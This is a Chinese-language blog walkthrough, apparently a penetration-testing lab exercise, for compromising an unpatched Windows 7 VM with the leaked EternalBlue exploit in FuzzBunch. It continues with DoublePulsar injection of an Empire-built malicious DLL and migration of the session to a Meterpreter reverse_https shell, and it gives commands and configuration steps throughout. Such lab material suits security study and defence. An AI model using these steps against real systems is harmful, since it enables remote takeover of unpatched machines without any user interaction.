---
layout: post
title: EternalBlue PoC Walkthrough
---

## 声明
本文主要基于 Sheila A. Berta [@UnaPibaGeek](https://twitter.com/UnaPibaGeek) 的 HOW TO EXPLOIT ETERNALBLUE & DOUBLEPULSAR TO GET AN EMPIRE/METERPRETER SESSION ON WINDOWS 7/2008, 并对于其中一些已发生变化的用法做必要修改。

## 前言
2017年5月12日爆发的 WannaCry 勒索病毒攻击再次使此前 The Shadow Broker 于2017年4月14日第五次泄露的 Equation Group 工具成为热点。当时虽然关注了该事件，也下载了泄露的文件，但并没有实际测试文件中的工具与 PoC。

近日学习渗透测试，感觉很有必要玩玩两次事件中都很火的 EternalBlue（永恒之蓝）。

## 准备工作
本次实验主要使用了 FuzzBunch(NSA的"Metasploit"), EternalBlue exploit 以及远程注入插件 DoublePulsar。

### 实验环境
* Target Machine (Windows 7 Enterprise Service Pack 1 32 bit): IP 192.168.186.133
* Attacker Machine 1 (Windows 7 Enterprise Service Pack 1 32 bit): IP 192.168.186.135
* Attacker Machine 2 (Kali Linux 2017.1): IP 192.168.186.136

__注意:__ 
* Target Machine 必须未安装 MS17-010 补丁，因为 EternalBlue 利用的漏洞在此补丁中被修复。建议下载 [IE VM](https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/) 作为实验平台;
* 使用两台攻击机是因为 FuzzBunch 运行在 Windows 平台；
* 三台机器的网络只需连通即可，不一定处在同一局域网。

[Empire tool](https://github.com/EmpireProject/Empire) 可以安装在 Attacker Machine 2 (Kali Linux）上。

### FuzzBunch
该框架使用 Python 2.6，并使用了旧版的 PyWin32: v2.12。
* Python 2.6: https://www.python.org/download/releases/2.6/ (添加到系统环境变量)
* PyWin32 v2.12: https://sourceforge.net/projects/pywin32/files/pywin32/Build%20212/
* Notepad++: https://notepad-plus-plus.org/download/ (可选，记事本亦可)

上述软件均使用默认安装方式即可。

#### Python 系统环境变量设置
将`;C:\python26`添加到 Path 变量即可。

#### 设置 FuzzBunch

下载 [FuzzBunch](https://github.com/fuzzbunch/fuzzbunch)，命令行进入解压后的目录
```
python fb.py
```
会报错，因为找不到目录“ListeningPost”，当然，我们下载的 FuzzBunch 文件里也没有这个目录，在`fb.py`中注释掉这行代码即可

![ListeningPost](/images/fuzzbunch_listeningpost.png "ListeningPost")

接着把`Fuzzbunch.xml`19, 24行中的路径换成本次实验的路径，例如

![Path](/images/fuzzbunch_path.png "Path")

下载的 FuzzBunch 中没有 `Logs`文件夹，在根目录新建即可

然后运行
```
python fb.py
```
FuzzBunch应该正确运行了

![FuzzBunch Success](/images/fuzzbunch_start_success.png "FuzzBunch Success")

启动 FuzzBunch时，我们需要填写 Target IP 和 Callback IP，对应之前的设置填写即可（图片为原文设置，与本次实验不同）

![FuzzBunch Ip Set](/images/fuzzbunch_start_ip.png "FuzzBunch Ip Set")

接下来新建一个项目(Project)，如果之前没有创建项目，敲回车键新建一个，可以看到日志会被保持到以项目名称命名的文件内。

![FuzzBunch Create Project](/images/fuzzbunch_project.png "FuzzBunch Create Project")

## 开始攻击

### 攻击 Target Machine
我们使用的 exploit 在 specials 目录下，而不是 payloads 目录，但执行
```
use EternalBlue
```
可以正常使用

![Use EternalBlue](/images/use_eternalblue.png "Use EternalBlue")

从本人测试的角度看，之后的配置全部选择默认即可，原作者倒是遇到了一些需要修改的地方

![EternalBlue Success](/images/eternalblue_success.png "EternalBlue Success")

如果一切顺利，应该可以看到上图中的 "Eternalblue Succeeded"

### 使用 Empire 进行恶意 DLL 注入
这步我们需要创建一个恶意 DLL(the Payload)，并使用 DoublePulsar 远程注入到之前使用 EternalBlue 感染的系统。
本次实验在 Kali Linux 平台进行

* 第一步：创建一个 listenner 监听 DLL 注入后获得的反弹连接(reverse connection)

![Empire Listener](/images/empire_listener.png "Empire Listener")

__注意：__ 由于 Empire 的语法改变，原文中的 `set Name Eternal` 之前先要执行 `uselistener http`, "Host" 的 IP 地址是 Attacker Machine 2 (Kali Linux) 的 IP 地址。

* 第二步：创建恶意 DLL

![Malicious DLL](/images/malicious_dll.png "Malicious DLL")

__注意：__ 由于 Empire 的语法改变，原文中的 `usestager dll Eternal` 变成了 `usestager windows/dll Eternel`, 而且 Arch 应根据 Target Machine 的实际架构选择，本次实验使用32系统，故运行 `set Arch x86`.

DLL 默认生成在 `/tmp/launcher.dll`，当然，我们也可以用 `set OutFile [绝对路径]` 指定 DLL 的名字和目录，接下来把该文件复制到运行 FuzzBunch 的 Attacker Machine 1.

### 使用 DoublePulsar 注入恶意 DLL
回到之前的 Attacker Machine 1 Windows 7 环境，在原来的 FuzzBunch 命令行直接输入
```
use DoublePulsar
```
![Use DoublePulsar](/images/use_doublepulsar.png "Use DoublePulsar")

使用 DoublePulsar 模块，大部分设置采用默认即可，如下部分根据实际环境修改

![DoublePulsar Config](/images/doublepulsar_config.png "DoublePulsar Config")

__注意：__ 
* 本次实验，架构选择 0 x86 32-bits;
* "Operation for backdoor to perform" 选择2, RunDLL;
* DllPayload 目录写之前生成的 launcher.dll 所在目录

接下来，运行 DoublePulsar 即可

![Run DoublePulsar](/images/run_doublepulsar.png "Run DoublePulsar")

如果一切顺利，我们应该可以看到如下结果

![DoublePulsar Success](/images/doublepulsar_success.png "DoublePulsar Success")

### 获得 Empire 会话
同时，在我们的 Kali Linux 攻击机，应该可以得到类似如下的结果

![Empire Session](/images/get_empire_session.png "Empire Session")

```
interact [会话名字]
```
可以运行如 `sysinfo` 等基本命令。

### 迁移会话至 Meterpreter
Empire 提供了一些命令，但本人对此不是很熟悉，当然，我们可以轻松迁移会话到 Meterpreter.

* 第一步：设置 Meterpreter 监听

![Meterpreter Listener](/images/meterpreter_listener.png "Meterpreter Listener")

__提示：__ 打开 Metasploit 后先运行 `use exploit/multi/handler`, Payload 是 __reverse_https__, 不是 __reverse_http__

![Meterpreter Exploit](/images/meterpreter_exploit_run.png "Meterpreter Exploit")

* 第二步： 在 Empire 中运行 `code_execution` 模块

![Usemodule code_execution](/images/empire_usemodule_code_execution.png "Usemodule code_execution")

__注意：__ 这里的 Lhost 是 Kali Linux 攻击机的 IP 地址，Lport 与 Meterpreter 中设置的 reverse_https Payload 的 LPORT 参数保持一致

* 第三步：获得 Meterpreter 会话
不出意外，Kali Linux 攻击机的 Meterpreter 可以得到迁移来的会话

![Meterpreter Session](/images/get_meterpreter_session.png "Meterpreter Session")

## 结语
本次实验实现了在仅知受害者 IP 地址的情况下，无需任何用户交互，拿到 Meterpreter Shell。

所以，系统一定要及时安装补丁，尤其是安全补丁。
这次算微软走运，在 Shadow Broker 放出大杀器前及时推送了安全补丁 MS17-010，据说依靠的是内部消息。

希望 WannaCry 勒索病毒的爆发可以唤醒大家的安全意识，当然，也为我们这种从业者提供更多的饭碗。

## Reference
* [PDF] https://www.exploit-db.com/docs/41896.pdf
* https://blogs.technet.microsoft.com/msrc/2017/04/14/protecting-customers-and-evaluating-risk/
* https://www.powershellempire.com/
